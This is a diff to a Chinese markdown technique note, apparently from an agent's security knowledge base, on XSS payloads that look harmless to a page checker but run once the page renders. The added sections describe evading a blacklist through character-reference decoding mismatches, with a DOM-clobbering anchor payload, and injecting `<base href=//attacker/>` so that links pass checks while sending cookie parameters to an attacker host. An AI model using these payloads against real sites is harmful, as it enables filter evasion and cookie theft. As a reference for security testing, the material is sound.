@@ -10,7 +10,7 @@
 - 检查实现里出现 `childElementCount`、`children`、`textContent`、`querySelectorAll(...).length`、`head.querySelector('meta[http-equiv="content-security-policy"]')` 这类结构断言；
 - 需要让一份 payload 同时满足"检查态无害"与"渲染态执行"。
 
-## 2. 四种机制
+## 2. 六种机制
 
 ### 2.1 noscript 双态解析
 
@@ -42,6 +42,16 @@
 ### 2.4 meta CSP 的生效时刻
 
 `<meta http-equiv="content-security-policy">` 只在其被解析到时生效：文档中位于它之前的脚本不受约束。与 DPU 组合可实现：检查态在 head 里看到 CSP meta（满足"必须带 CSP"类断言），渲染态脚本先执行、meta 后生效。
+
+### 2.5 服务端实体解码器 vs 浏览器字符引用消费
+
+同一份含字符引用的输入，服务端解码与浏览器解析遵循不同规则——服务端解码器常见实现只认**以 `;` 结尾**的引用（如 `/&(#x[0-9a-f]+|#[0-9]+|[a-z]+);/gi`），而 HTML 规范允许浏览器消费**无分号的数字引用**（`&#105` → `i`，缺省分号按历史行为解析成功）。于是 `w&#105dget` 服务端原样保留、浏览器解析出 `widget`——黑名单词（id/name/href 属性值; **标签名不适用**——tokenizer 的标签名状态不解码字符引用，两侧都保持字面）只在浏览器侧复活。
+
+**检查方法**：读服务端解码正则确认分号是否必选；对无分号形式用无头浏览器验证实际解析值（`document.querySelector` 按解码后 id 查找命中即成立）。**利用形态**：绕过存储型内容黑名单构造 DOM clobbering 锚点（`<a id=w&#105dget name=m&#111de href=x>` N 个重复 id 的 name 属性经 HTMLCollection 命名属性当配置对象，见 `$AGENT_DIR/knowledge-base/xss-advanced.md` §5）。
+
+### 2.6 `<base>` 使属性校验与 URL 使用分离
+
+脚本校验读原始值（`getAttribute('href')` + `startsWith('/admin/')` 过检），导航用解析值——`<a>` 元素的 `href` IDL 属性取值时按 `document.baseURI` 解析成绝对 URL 字符串，而 `<base>` 元素正是改变 `document.baseURI` 的手段。注入 `<base href=//attacker/>` 后 raw href 仍是 `/admin/...` 前缀（过检），IDL 解析值却成为攻击者域绝对 URL（下游 `new URL(next.href)` 收到的是这个已被改源的绝对串）——cookie 参数随导航外带。双表征（原始属性 vs 解析 URL）消费不一致即信任边界失效，审计两处读法必须同源。
 
 ## 3. 条件式 payload 构造
 
